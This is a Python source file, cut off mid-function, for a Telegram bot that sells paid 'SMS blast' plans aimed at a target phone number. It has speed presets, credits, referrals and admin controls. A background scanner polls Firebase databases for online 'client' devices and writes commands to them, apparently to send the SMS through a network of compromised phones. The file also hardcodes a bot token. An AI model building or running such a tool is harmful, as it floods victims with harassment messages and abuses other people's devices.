import asyncio
import json
import logging
import os
import random
import string
import time
from datetime import datetime

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    BufferedInputFile,
    CallbackQuery,
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    Message,
    ReplyKeyboardMarkup,
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("FlexxyMonster")

# ========== PERSISTENT STORAGE & CONFIG ==========
DATA_DIR = os.getenv("RAILWAY_VOLUME_MOUNT_PATH") or os.getenv("DATA_DIR") or "."
os.makedirs(DATA_DIR, exist_ok=True)
_DATA_FILE = os.path.join(DATA_DIR, "flexxy_monster_bdata.json")
_BACKUP_FILE = os.path.join(DATA_DIR, "flexxy_monster_bdata_backup.json")

_VERSION = "FLEXXY MONSTER HIGH SPEED V5"
_PROGRESS_UPDATE_INTERVAL = 0.30
_BACKGROUND_SCAN_INTERVAL = 60.0

# Controlled steady pace (approx 6 to 10 SMS/sec max across workers)
SPEED_FAST = 0.11       # ~9 SMS/sec
SPEED_MEDIUM = 0.14     # ~7 SMS/sec
SPEED_SLOW = 0.17       # ~6 SMS/sec
SPEED_DEFAULT = SPEED_FAST

MAIN_OWNER = 8241730977
SUPER_ADMIN_NAME = "@Sakira540"
SUPER_ADMIN_LINK = "https://t.me/Sakira540"
CREDIT_CONTACT_HANDLE = "@tcxsu"
CREDIT_CONTACT_LINK = "https://t.me/tcxsu"
SUPER_ADMINS = [8241730977]

BOT_TOKEN = os.getenv("BOT_TOKEN", "9273864914:AAGSMztMHacgkv_nhGhBNwo9EYzmnDxE_fQ")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1004437456868"))

PREMIUM_TIERS = [
    {"key": "1d", "label": "1 Day Premium", "days": 1, "price": 10},
    {"key": "7d", "label": "7 Days Premium", "days": 7, "price": 30},
    {"key": "1m", "label": "1 Month Premium", "days": 30, "price": 70},
    {"key": "3m", "label": "3 Months Premium", "days": 90, "price": 130},
    {"key": "1y", "label": "1 Year Premium", "days": 365, "price": 200},
]

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"      # 🔥
EMOJI_STAR = "5372849966689566579"      # ⭐
EMOJI_ROCKET = "5359664288241829619"    # 🚀
EMOJI_CROWN = "6237927637906364256"     # 👑
EMOJI_SHIELD = "6235476345451716705"    # 🛡
EMOJI_MONEY = "6244678063775289843"     # 💰
EMOJI_PHONE = "6239930832128056797"     # 📱
EMOJI_CHECK = "4958689671950369798"     # ✅
EMOJI_CROSS = "4958900559139570572"     # ❌
EMOJI_WARNING = "4958526153955476488"   # ⚠️
EMOJI_LOCK = "4956719506027185156"      # 🔒
EMOJI_GIFT = "5084613633418199991"      # 🎁
EMOJI_BELL = "5098265504796115765"      # 🔔
EMOJI_GEAR = "5116414868357907335"      # ⚙️
EMOJI_VIDEO = "5372849966689566579"     # 📹

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789",
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def _colored_inline_btn(
    text: str,
    callback_data: str | None = None,
    url: str | None = None,
    emoji_id: str | None = None,
    fallback_emoji: str = "",
    style: str = "primary",
) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    kwargs: dict = {"text": label}
    if callback_data is not None:
        kwargs["callback_data"] = callback_data
    if url is not None:
        kwargs["url"] = url
    if emoji_id:
        kwargs["icon_custom_emoji_id"] = emoji_id
    if style in ("primary", "success", "danger"):
        kwargs["style"] = style
    try:
        return InlineKeyboardButton(**kwargs)
    except TypeError:
        kwargs.pop("style", None)
        return InlineKeyboardButton(**kwargs)

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "", style: str = "primary") -> InlineKeyboardButton:
    return _colored_inline_btn(text=text, callback_data=callback_data, emoji_id=emoji_id, fallback_emoji=fallback_emoji, style=style)

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "", style: str = "success") -> InlineKeyboardButton:
    return _colored_inline_btn(text=text, url=url, emoji_id=emoji_id, fallback_emoji=fallback_emoji, style=style)

def style_btn(text: str, style: str = "primary", request_contact: bool = False, request_location: bool = False) -> KeyboardButton:
    kb_btn = KeyboardButton(text=sc(text), request_contact=request_contact, request_location=request_location)
    if style in ["primary", "success", "danger"]:
        try:
            setattr(kb_btn, "style", style)
        except Exception:
            pass
    return kb_btn

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("🚀 Send SMS", style="success"), style_btn("⚡ Ping", style="primary")],
            [style_btn("📹 Videos", style="primary"), style_btn("💰 Credits & Plan", style="primary")],
            [style_btn("🛑 Stop Blast", style="danger")],
        ],
        resize_keyboard=True,
    )

# ========== RUNTIME STATE ==========
class UserSession:
    __slots__ = ["uid", "cancelled", "paused", "sent", "failed", "task", "start_time", "lock", "number"]

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.paused = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None

USER_SESSIONS: dict[int, UserSession] = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES: list[dict] = []
LAST_SCAN_TIME = 0.0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG: list[dict] = []
FB_DEVICE_COUNTS: dict[str, dict] = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS: dict[str, int] = {}

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    import_db_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    auto_msg_text = State()
    auto_msg_custom_min = State()
    give_premium_uid = State()
    give_premium_custom_days = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()

# ========== DATABASE & PERSISTENCE ==========
def _default_plans() -> list[dict]:
    return [
        {"id": "p_1d", "name": "1 Day Premium", "price": 10, "days": 1, "credits": 999999, "currency": "INR", "payment_link": CREDIT_CONTACT_LINK},
        {"id": "p_7d", "name": "7 Days Premium", "price": 30, "days": 7, "credits": 999999, "currency": "INR", "payment_link": CREDIT_CONTACT_LINK},
        {"id": "p_1m", "name": "1 Month Premium", "price": 70, "days": 30, "credits": 999999, "currency": "INR", "payment_link": CREDIT_CONTACT_LINK},
        {"id": "p_3m", "name": "3 Months Premium", "price": 130, "days": 90, "credits": 999999, "currency": "INR", "payment_link": CREDIT_CONTACT_LINK},
        {"id": "p_1y", "name": "1 Year Premium", "price": 200, "days": 365, "credits": 999999, "currency": "INR", "payment_link": CREDIT_CONTACT_LINK},
    ]

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 2000, "tiers": PREMIUM_TIERS},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": _default_plans()},
        "redeem_codes": {},
        "settings": {"ref_credits": 2000, "max_owners": 6},
        "auto_broadcast": {
            "enabled": False,
            "interval_minutes": 5,
            "message": "",
            "last_msg_ids": {},
            "last_run": 0,
            "runs": 0,
        },
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": [],
    }

def _read_json_file(path: str) -> dict | None:
    if not os.path.exists(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            raw = f.read().strip()
            if not raw:
                return None
            obj = json.loads(raw)
            return obj if isinstance(obj, dict) else None
    except Exception as e:
        log.error(f"Read error ({path}): {e}")
        return None

def load() -> dict:
    data = _read_json_file(_DATA_FILE) or _read_json_file(_BACKUP_FILE)
    if data is None:
        d = _default_data()
        save(d)
        return d

    default = _default_data()
    for k, v in default.items():
        if k not in data:
            data[k] = v
    ab = data.setdefault("auto_broadcast", {})
    ab.setdefault("interval_minutes", 5)
    ab.setdefault("enabled", False)
    ab.setdefault("message", "")
    ab.setdefault("last_msg_ids", {})
    ab.setdefault("last_run", 0)
    ab.setdefault("runs", 0)

    if not data.get("pricing", {}).get("plans"):
        data["pricing"] = {"plans": _default_plans()}
    if MAIN_OWNER not in data.get("owners", []):
        data["owners"].insert(0, MAIN_OWNER)

    for uid_str, u in data.get("users", {}).items():
        u.setdefault("credits", 0)
        u.setdefault("sms_history", [])
        u.setdefault("premium_until", 0)
        u.setdefault("premium_plan", None)

    global PROTECTED_NUMBERS
    PROTECTED_NUMBERS = dict(data.get("protected_numbers", {}))
    return data

def save(d: dict):
    tmp_path = _DATA_FILE + ".tmp"
    serialized = json.dumps(d, indent=2, ensure_ascii=False)
    with open(tmp_path, "w", encoding="utf-8") as f:
        f.write(serialized)
    os.replace(tmp_path, _DATA_FILE)
    try:
        with open(_BACKUP_FILE, "w", encoding="utf-8") as bf:
            bf.write(serialized)
    except Exception as e:
        log.warning(f"Backup write warning: {e}")

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name,
            "uses": 0,
            "credits": 0,
            "premium_until": 0,
            "premium_plan": None,
            "joined_at": int(time.time()),
            "refer_code": None,
            "referred_by": None,
            "sms_history": [],
        }
        return True
    d["users"][k]["name"] = name
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()),
        "uid": uid,
        "action": action,
        "details": details,
    })
    if len(d["activity_log"]) > 1500:
        d["activity_log"] = d["activity_log"][-1500:]

# ========== ROLES & PREMIUM HELPERS ==========
def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def get_premium_remaining_sec(uid: int, d: dict) -> int:
    u = d.get("users", {}).get(str(uid), {})
    until = int(u.get("premium_until", 0) or 0)
    rem = until - int(time.time())
    return rem if rem > 0 else 0

def has_active_premium(uid: int, d: dict) -> bool:
    return get_premium_remaining_sec(uid, d) > 0

def fmt_remaining_validity(seconds: int) -> str:
    if seconds <= 0:
        return "Expired"
    days, rem = divmod(seconds, 86400)
    hours, rem2 = divmod(rem, 3600)
    mins = rem2 // 60
    if days > 0:
        return f"{days}d {hours}h left"
    if hours > 0:
        return f"{hours}h {mins}m left"
    return f"{max(1, mins)}m left"

def grant_user_premium(uid: int, days: int, plan_label: str, d: dict) -> int:
    k = str(uid)
    now = int(time.time())
    d.setdefault("users", {}).setdefault(k, {
        "name": f"User_{uid}",
        "uses": 0,
        "credits": 0,
        "premium_until": 0,
        "premium_plan": None,
        "joined_at": now,
        "refer_code": None,
        "referred_by": None,
        "sms_history": [],
    })
    current_until = int(d["users"][k].get("premium_until", 0) or 0)
    base_ts = current_until if current_until > now else now
    new_until = base_ts + int(days * 86400)
    d["users"][k]["premium_until"] = new_until
    d["users"][k]["premium_plan"] = plan_label
    return new_until

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if has_active_premium(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return get_user_credits(uid, d) > 0

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid):
        return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d):
        return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []):
        return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    rem = get_premium_remaining_sec(uid, d)
    if rem > 0:
        return f"{em(EMOJI_CROWN, '💎')} ᴘʀᴇᴍɪᴜᴍ ({fmt_remaining_validity(rem)})"
    if uid in d.get("approved", []):
        return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"):
        return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return int(d.get("users", {}).get(str(uid), {}).get("credits", 0) or 0)

def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    now = int(time.time())
    if k not in d.get("users", {}):
        d["users"][k] = {
            "name": f"User_{uid}",
            "uses": 0,
            "credits": 0,
            "premium_until": 0,
            "premium_plan": None,
            "joined_at": now,
            "refer_code": None,
            "referred_by": None,
            "sms_history": [],
        }
    d["users"][k]["credits"] = int(d["users"][k].get("credits", 0) or 0) + int(amount)

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = int(d["users"][k].get("credits", 0) or 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = int(d.get("settings", {}).get("ref_credits", 2000) or 2000)
    add_credits(new_uid, ref_credits, d)
    add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍᴇ! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
            async with session.post(url, json=payload, timeout=5) as resp:
                res = await resp.json()
                if res.get("ok"):
                    msg_id = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Fire Effect Trigger Failed: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if videos:
        video_item = random.choice(videos)
        try:
            await bot.send_video(chat_id, video=video_item, caption=caption, parse_mode="HTML")
        except Exception as e:
            log.error(f"Failed to send random video: {e}")

# ========== KEYBOARDS & FORMATTING ==========
def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text=t, callback_data=c) for t, c in row] for row in rows]
    )

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                btn("ғᴀsᴛ (~9/s)", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="success"),
                btn("ᴍᴇᴅɪᴜᴍ (~7/s)", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
                btn("sʟᴏᴡ (~6/s)", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="primary"),
            ],
            [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")],
        ]
    )

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(
    sent: int,
    failed: int,
    total: int,
    number: str = "",
    credits: int | None = None,
    speed_label: str = "🚀 FAST",
    paused: bool = False,
) -> str:
    done = sent + failed
    bar = progress_bar(done, total)
    percent = int((done / total) * 100) if total > 0 else 0
    state_line = f"{em(EMOJI_WARNING, '⏸')} <b>{sc('paused')}</b>" if paused else f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('sending sms...')}</b>"
    lines = [
        f"╔══════════════════════╗",
        f"  {state_line}",
        f"╚══════════════════════╝\n",
    ]
    if number:
        lines.append(f"{em(EMOJI_PHONE, '📞')} ᴛᴀʀɢᴇᴛ   : <code>{mask_number(number)}</code>")
    lines.extend([
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ     : <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ   : <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss : <b>{done}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ    : <b>{speed_label}</b>",
    ])
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs  : <b>{credits}</b>")
    return "\n".join(lines)

def active_send_kb(paused: bool = False) -> InlineKeyboardMarkup:
    pause_btn = (
        btn("ʀᴇsᴜᴍᴇ ʙʟᴀsᴛ", "user:resume_send", EMOJI_CHECK, "▶️", style="success")
        if paused
        else btn("ᴘᴀᴜsᴇ ʙʟᴀsᴛ", "user:pause_send", EMOJI_WARNING, "⏸", style="primary")
    )
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [pause_btn, btn("sᴛᴏᴘ ʙʟᴀsᴛ", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")],
        ]
    )

def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def fmt_time(ts: int) -> str:
    if not ts:
        return "N/A"
    return datetime.fromtimestamp(int(ts)).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def fmt_interval_label(minutes: int) -> str:
    mins = max(1, int(minutes or 5))
    if mins % 60 == 0:
        hrs = mins // 60
        return f"{hrs}h" if hrs == 1 else f"{hrs}h ({mins}m)"
    return f"{mins}m"

def get_scan_status() -> str:
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    device_count = len(CACHED_DEVICES)
    time_diff = time.time() - LAST_SCAN_TIME
    if time_diff < 60:
        return f"{em(EMOJI_CHECK, '🟢')} {device_count} ᴅᴇᴠɪᴄᴇs"
    if time_diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"
    return f"{em(EMOJI_CROSS, '🔴')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"

# ========== BACKGROUND WORKERS (CUSTOM INTERVAL AUTO NOTIF + SCANNER) ==========
def format_auto_notification(msg_text: str, run_count: int = None, interval_min: int = 5) -> str:
    tag = f" • #{run_count}" if run_count is not None else ""
    iv_label = fmt_interval_label(interval_min)
    return (
        f"╔══════════════════════╗\n"
        f"  {em(EMOJI_BELL, '🔔')} <b>{sc('live notification')}</b>{tag}\n"
        f"╚══════════════════════╝\n\n"
        f"{msg_text}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<i>{em(EMOJI_GEAR, '🔄')} {sc(f'auto-updates every {iv_label} (old msg deleted)')}</i>"
    )

async def push_5min_notifications(bot: Bot, d: dict, force: bool = False) -> tuple[int, int]:
    ab = d.setdefault(
        "auto_broadcast",
        {"enabled": False, "interval_minutes": 5, "message": "", "last_msg_ids": {}, "last_run": 0, "runs": 0},
    )
    if not force and not ab.get("enabled"):
        return 0, 0
    msg_text = (ab.get("message") or "").strip()
    if not msg_text:
        return 0, 0

    interval_min = max(1, int(ab.get("interval_minutes", 5) or 5))
    runs = int(ab.get("runs", 0) or 0) + 1
    formatted = format_auto_notification(msg_text, runs, interval_min)
    users = d.get("users", {})
    banned = set(d.get("banned", []))
    last_ids = ab.setdefault("last_msg_ids", {})

    sent_ok = 0
    sent_fail = 0

    for uid_str in list(users.keys()):
        try:
            uid = int(uid_str)
            if uid in banned:
                continue
            old_mid = last_ids.get(uid_str)
            if old_mid:
                try:
                    await bot.delete_message(chat_id=uid, message_id=int(old_mid))
                except Exception:
                    pass
            sent_msg = await bot.send_message(chat_id=uid, text=formatted, parse_mode="HTML")
            last_ids[uid_str] = sent_msg.message_id
            sent_ok += 1
            await asyncio.sleep(0.03)
        except Exception:
            sent_fail += 1

    ab["last_run"] = int(time.time())
    ab["runs"] = runs
    save(d)
    return sent_ok, sent_fail

async def auto_notification_loop(bot: Bot):
    log.info("Auto Notification Loop STARTED")
    while True:
        await asyncio.sleep(15)
        try:
            d = load()
            ab = d.get("auto_broadcast", {})
            if ab.get("enabled") and (ab.get("message") or "").strip():
                interval_sec = max(60, int(ab.get("interval_minutes", 5) or 5) * 60)
                last_run = int(ab.get("last_run", 0) or 0)
                if (time.time() - last_run) >= interval_sec:
                    ok, fail = await push_5min_notifications(bot, d, force=False)
                    log.info(f"[AUTO-NOTIF] Sent: {ok}, Failed: {fail}")
        except Exception as e:
            log.error(f"[AUTO-NOTIF] Error: {e}")

async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG

    log.info("Background Firebase Scanner STARTED")
    first_scan_done = False

    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5)
                continue
            SCANNING_IN_PROGRESS = True

        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
        start_scan = time.time()

        try:
            d = load()
            fbs = d.get("firebases", [])

            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs ᴄᴏɴғɪɢᴜʀᴇᴅ"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan
            CACHED_DEVICES = devices

            for fb in fbs:
                fb_id = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb_label,
                    "online": fb_online,
                    "last_update": int(time.time()),
                }
            LAST_SCAN_TIME = time.time()

            DEVICE_HEALTH_LOG.append({
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices",
            })
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
                current_fb_ids = {fb["id"] for fb in fbs}
                for stale in [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]:
                    FB_DEVICE_COUNTS.pop(stale, None)

                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('background scanner active!')}</b>\n\n"
                            f"{em(EMOJI_PHONE, '📱')} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ: <b>{len(devices)}</b>\n"
                            f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs: <b>{len(fbs)}</b>\n"
                            f"{em(EMOJI_GEAR, '🔄')} ᴀᴜᴛᴏ-sᴄᴀɴ: ᴇᴠᴇʀʏ <b>1 ᴍɪɴᴜᴛᴇ</b>\n"
                            f"{em(EMOJI_WARNING, '⏱')} sᴄᴀɴ ᴛɪᴍᴇ: <b>{scan_duration:.1f}s</b>",
                            parse_mode="HTML",
                        )
                    except Exception:
                        pass
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"

        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[BG-SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

# ========== REAL FIREBASE & CONTROLLED SPEED (6-10/s) SMS ENGINE ==========
_HTTP_SESSION: aiohttp.ClientSession | None = None

async def get_http() -> aiohttp.ClientSession:
    global _HTTP_SESSION
    if _HTTP_SESSION is None or _HTTP_SESSION.closed:
        connector = aiohttp.TCPConnector(limit=60, limit_per_host=12, ttl_dns_cache=300)
        _HTTP_SESSION = aiohttp.ClientSession(connector=connector)
    return _HTTP_SESSION

def get_cached_devices() -> list[dict]:
    return CACHED_DEVICES

async def fb_put_real(session: aiohttp.ClientSession, base_url: str, path: str, payload: dict) -> bool:
    """Strictly returns True only when Firebase REST endpoint accepts the write (HTTP 2xx)."""
    url = base_url.rstrip("/") + path
    try:
        async with session.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as r:
            return 200 <= r.status < 300
    except Exception:
        return False

def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1),
    ])

async def get_all_online_devices(d: dict) -> list[dict]:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results: list[dict] = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]

    http = await get_http()
    _dev_sem = asyncio.Semaphore(20)

    async def fetch_one(fb: dict):
        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with http.get(shallow_url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status != 200:
                    return
                txt = (await r.text()).strip()
                if txt == "null" or not txt:
                    return
                device_ids = json.loads(txt)
                if not isinstance(device_ids, dict):
                    return

                async def fetch_dev(dev_id: str):
                    try:
